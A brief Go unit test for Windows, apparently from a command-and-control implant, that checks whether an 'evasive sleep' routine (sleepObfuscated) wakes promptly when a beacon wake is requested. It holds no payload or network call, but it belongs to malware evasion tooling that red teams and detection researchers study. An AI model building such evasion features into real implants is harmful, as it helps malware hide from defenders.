//go:build windows

package main

import (
	"testing"
	"time"
)

func TestSleepObfuscatedStopsOnWake(t *testing.T) {
	drainBeaconWakeCh()
	t.Cleanup(drainBeaconWakeCh)

	requestBeaconWake()
	start := time.Now()
	sleepObfuscated(30 * time.Second)
	if elapsed := time.Since(start); elapsed > 3*time.Second {
		t.Fatalf("evasive sleep ignored the wake for %v", elapsed)
	}
}
